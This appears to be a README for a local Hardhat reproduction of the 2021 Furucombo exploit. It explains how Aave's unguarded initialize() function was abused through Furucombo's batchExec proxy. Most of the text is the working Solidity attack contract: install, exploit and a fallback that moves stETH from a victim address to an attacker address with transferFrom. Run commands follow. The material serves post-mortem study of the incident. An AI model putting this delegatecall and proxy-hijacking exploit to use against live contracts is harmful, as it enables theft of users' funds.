
# Attack #1: Furucombo


## Attack Vector

The attack vector is described in full detail here:

https://medium.com/furucombo/furucombo-post-mortem-march-2021-ad19afd415e

and here:

https://rekt.news/furucombo-rekt/


## Attack Contract Implementation

### Constructor: 
Sets the current Furucombo proxy contract and AaveV2 addresses.

```solidity
    constructor (address payable _fcProxy, address _aave) public {
        owner = msg.sender;
        furucomboProxy = Proxy (_fcProxy);
        aaveAddr = _aave;
    }
```

### Install:

```solidity
    function install () public {
        address[] memory aaveProxyAddr = new address[](1);
        bytes32[] memory dummyConfig = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        aaveProxyAddr[0] = aaveAddr;
        dummyConfig[0] = 0;
        bytes memory installedFunc = abi.encodeWithSignature("installed()");
        // Call Aave's `initialize` function with our custom arguments
        bytes memory payload = abi.encodeWithSignature("initialize(address,bytes)", address(this), installedFunc);
        datas[0] = payload;

        furucomboProxy.batchExec(aaveProxyAddr, dummyConfig, datas);
        _installed = true;
    }
```

Effectively utilizes the following function from the **AaveV2** contract to place the address of the attacker contract in the "IMPLEMENTATION_SLOT" slot inside the **Furucombo proxy contract** storage.  
This means that subsequent calls to **AaveV2** from the FC proxy will result in delegate calls to the **Attacker contract** (as *AaveV2 proxy* thinks that the *Attacker contract* is actually its implementation contract).

```solidity
contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
  function initialize(address _logic, bytes memory _data) public payable {
    require(_implementation() == address(0));
    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));
    _setImplementation(_logic);
    if (_data.length > 0) {
      (bool success, ) = _logic.delegatecall(_data);
      require(success);
    }
  }
}
```
After the malicious contract is installed, a call to:
```solidity
    function installed () public {
        console.log("Inside ATK: Installed!");
        // Could also be an event or something to ping the attacker
    }
```
is made, via:

`(bool success, ) = _logic.delegatecall(_data);`

to inform the attacker that the malicious contract is successfully installed.


### Exploit:

Calls **Furucombo proxy** which delegatecalls to the *exploit*-specified **AaveV2** proxy, which in turn delegatecalls to the *Fallback* function of... the **Attacker contract**!

```solidity
    function exploit () public {     
        address[] memory aaveProxyAddr = new address[](1);
        bytes32[] memory dummyConfig = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        aaveProxyAddr[0] = aaveAddr;
        dummyConfig[0] = 0;
        datas[0] = abi.encodeWithSignature("");

        furucomboProxy.batchExec(aaveProxyAddr, dummyConfig, datas);
    }
```

### Fallback:

This is where the actual fund-altering code resides.
When the *Fallback* function is called, the **Attacker contract** can successfully impersonate **Furucombo proxy** through a chain of `delegatecall` operations.

Here we simulated just 1 (of the many) actual fund-stealing transactions:

https://etherscan.io/tx/0x5af11a27e98a167b61b01fea093cf612d5ec76c20fd2032f2d1aa49c8b1ee529


```solidity
    fallback () external payable {
        address stEthAddr = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        address payable victim = 0x78Bc49be7bae5e0eeC08780c86F0e8278B8B035b;
        address payable hacker = 
                0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199;  // Dummy address
        uint256 amount = 3943962136013873249416;
        
        // "Unauthorized" transfer
        IERC20(stEthAddr).transferFrom(victim, hacker, amount);
    }
```

## Simulate the Attack

Inside `~/hardhat-projects/furucombo-rekt/` run:

Terminal #0:

```bash
$ npx hardhat node
```

Terminal #1:
```bash
$ npx hardhat run scripts/script.js
```


